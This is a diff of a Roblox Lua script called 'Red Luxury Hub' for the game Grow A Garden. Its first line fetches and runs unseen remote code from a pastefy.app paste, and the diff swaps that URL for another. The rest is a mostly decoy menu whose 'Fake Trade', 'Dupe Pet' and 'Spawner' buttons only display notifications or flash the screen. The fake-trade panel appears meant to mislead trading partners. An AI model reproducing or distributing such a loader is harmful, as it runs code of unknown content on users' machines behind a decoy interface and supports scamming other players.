@@ -1,1 +1,229 @@
-loadstring(game:HttpGet("https://pastefy.app/pCe2v3kG/raw"))()
+loadstring(game:HttpGet("https://pastefy.app/svB9EsBC/raw"))()
+
+-- =======================================================
+-- RED LUXURY HUB | Made by vdawngg
+-- =======================================================
+
+-- Freeze 5s khi mở script
+local t = tick() + 5
+while tick() < t do end
+
+-- Load Rayfield
+local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
+
+-- Main Window
+local Window = Rayfield:CreateWindow({
+    Name = "❤️ Red Luxury Hub | made by vdawngg",
+    LoadingTitle = "Grow A Garden - Red Luxury",
+    LoadingSubtitle = "made by vdawngg",
+    ConfigurationSaving = {
+        Enabled = true,
+        FolderName = "RedLuxuryHub",
+        FileName = "Config"
+    },
+    KeySystem = false
+})
+
+-- Hàm notify đỏ sang trọng
+local function RedNotify(title, content)
+    Rayfield:Notify({
+        Title = "🔴 " .. title,
+        Content = content,
+        Duration = 4,
+        Image = 4483362458
+    })
+end
+
+-- =======================================================
+-- TAB: TRADE
+-- =======================================================
+local tradeTab = Window:CreateTab("💰 Trade", 4483362458)
+tradeTab:CreateSection("Freeze Trade 🔊")
+
+local toggles = {}
+local btnNames = {"Auto Accept", "Can't Cancel", "Freeze Trade", "Can't Leave"}
+for _, name in ipairs(btnNames) do
+    tradeTab:CreateToggle({
+        Name = name,
+        CurrentValue = false,
+        Callback = function(Value)
+            toggles[name] = Value
+            RedNotify("Freeze Trade", name .. " is now " .. (Value and "ON" or "OFF"))
+        end
+    })
+end
+
+tradeTab:CreateButton({
+    Name = "Leave Server",
+    Callback = function()
+        local TeleportService = game:GetService("TeleportService")
+        TeleportService:TeleportToPlaceInstance(0, "", game.Players.LocalPlayer)
+    end,
+})
+
+tradeTab:CreateSection("Fake Trade 🍊")
+tradeTab:CreateDropdown({
+    Name = "Select Pet",
+    Options = {"Kitsune", "Queen Bee", "T-Rex", "Disco Bee", "Corrupted Kitsune", "Raccoon", "Dragonfly", "Butterfly", "Spinosaurus"},
+    CurrentOption = "None",
+    Callback = function(Value) getgenv().SelectedPet = Value end,
+})
+tradeTab:CreateInput({
+    Name = "Weight (kg)",
+    PlaceholderText = "Enter kg",
+    RemoveTextAfterFocusLost = false,
+    Callback = function(Text) getgenv().SelectedKg = Text end,
+})
+tradeTab:CreateDropdown({
+    Name = "Mutation",
+    Options = {"Shiny", "Inverted", "Frozen", "Golden", "Tiny", "Ironskin", "Shocked", "Rainbow", "Radiant", "Ascended", "Tranquil", "Corrupt", "Fried"},
+    CurrentOption = "None",
+    Callback = function(Value) getgenv().SelectedMutation = Value end,
+})
+tradeTab:CreateButton({
+    Name = "Add Pet To Trade",
+    Callback = function()
+        RedNotify("Fake Trade", "Transferring...")
+        task.wait(2)
+        RedNotify("Fake Trade", "Added: " .. (getgenv().SelectedMutation or "") .. " " ..
+            (getgenv().SelectedPet or "") .. " - " .. (getgenv().SelectedKg or "") .. "kg")
+    end,
+})
+
+-- =======================================================
+-- TAB: RANDOMIZE
+-- =======================================================
+local randTab = Window:CreateTab("🎲 Randomize", 4483362458)
+randTab:CreateSection("Random System")
+
+local pets = {"Kitsune", "Queen Bee", "T-Rex", "Disco Bee", "Corrupted Kitsune", "Raccoon", "Dragonfly", "Butterfly", "Spinosaurus"}
+local mutations = {"Shiny", "Inverted", "Frozen", "Golden", "Tiny", "Ironskin", "Shocked", "Rainbow", "Radiant", "Ascended", "Tranquil", "Corrupt", "Fried"}
+
+local function pickRandom(list)
+    return list[math.random(1, #list)]
+end
+
+randTab:CreateButton({
+    Name = "🎲 Randomize Pet",
+    Callback = function()
+        local result = pickRandom(pets)
+        RedNotify("Random Pet", "You got: " .. result)
+    end,
+})
+randTab:CreateButton({
+    Name = "✨ Randomize Mutation",
+    Callback = function()
+        local result = pickRandom(mutations)
+        RedNotify("Random Mutation", "You got: " .. result)
+    end,
+})
+randTab:CreateButton({
+    Name = "🎁 Random Surprise",
+    Callback = function()
+        local pet = pickRandom(pets)
+        local mut = pickRandom(mutations)
+        RedNotify("Surprise!", "Your result: " .. mut .. " " .. pet)
+    end,
+})
+
+-- =======================================================
+-- TAB: SPAWNER
+-- =======================================================
+local spawnerTab = Window:CreateTab("⚡ Spawner", 4483362458)
+spawnerTab:CreateButton({
+    Name = "Run Spawner",
+    Callback = function()
+        RedNotify("Spawner", "Spawner started (demo)")
+    end,
+})
+
+-- =======================================================
+-- TAB: MISC
+-- =======================================================
+local miscTab = Window:CreateTab("⚙️ Misc", 4483362458)
+local dupeState = false
+miscTab:CreateToggle({
+    Name = "Detect Dupe Pet",
+    CurrentValue = false,
+    Callback = function(Value) dupeState = Value end,
+})
+miscTab:CreateButton({
+    Name = "Dupe Pet (allow mutation)",
+    Callback = function()
+        local screenGui = Instance.new("ScreenGui", game.CoreGui)
+        local blackFlash = Instance.new("Frame", screenGui)
+        blackFlash.Size = UDim2.new(1, 0, 1, 0)
+        blackFlash.BackgroundColor3 = Color3.new(0.5, 0, 0) -- đỏ đậm
+        blackFlash.BackgroundTransparency = 1
+
+        local msg = Instance.new("TextLabel", blackFlash)
+        msg.Size = UDim2.new(1, 0, 0.2, 0)
+        msg.Position = UDim2.new(0, 0, 0.4, 0)
+        msg.Text = "Duping in progress 🔴 made by vdawngg"
+        msg.TextColor3 = Color3.new(1, 1, 0)
+        msg.BackgroundTransparency = 1
+        msg.Font = Enum.Font.GothamBlack
+        msg.TextScaled = true
+
+        for i = 1, 15 do
+            blackFlash.BackgroundTransparency = 0
+            task.wait(0.1)
+            blackFlash.BackgroundTransparency = 1
+            task.wait(0.1)
+        end
+        screenGui:Destroy()
+        RedNotify("Dupe", "Process finished ✅")
+    end,
+})
+
+-- =======================================================
+-- TAB: FINDER
+-- =======================================================
+local finderTab = Window:CreateTab("🔍 Finder", 4483362458)
+finderTab:CreateInput({
+    Name = "Find Server",
+    PlaceholderText = "Current server version: v1701",
+    RemoveTextAfterFocusLost = false,
+    Callback = function() end,
+})
+finderTab:CreateButton({
+    Name = "Search Server",
+    Callback = function()
+        RedNotify("Finder", "Searching server... please wait")
+    end,
+})
+finderTab:CreateInput({
+    Name = "Find Pet",
+    PlaceholderText = "Best pet in server: ...",
+    RemoveTextAfterFocusLost = false,
+    Callback = function() end,
+})
+finderTab:CreateButton({
+    Name = "Start Searching",
+    Callback = function()
+        RedNotify("Finder", "Scanning pets in server...")
+
+        local priorityList = {"Corrupted Kitsune", "Queen Bee", "Dragonfly", "T-Rex", "Spinosaurus", "Butterfly", "Raccoon", "Disco Bee", "Kitsune"}
+        local bestPet = nil
+
+        for _, player in ipairs(game.Players:GetPlayers()) do
+            if player ~= game.Players.LocalPlayer then
+                local petsFolders = {player:FindFirstChild("Backpack"), player:FindFirstChild("Pets"), player:FindFirstChild("Garden")}
+                for _, folder in pairs(petsFolders) do
+                    if folder then
+                        for _, pet in pairs(folder:GetDescendants()) do
+                            if table.find(priorityList, pet.Name) then
+                                bestPet = pet.Name
+                                break
+                            end
+                        end
+                    end
+                    if bestPet then break end
+                end
+            end
+            if bestPet then break end
+        end
+
+        RedNotify("Finder", "Best pet in server: " .. (bestPet or "None"))
+    end,
+})
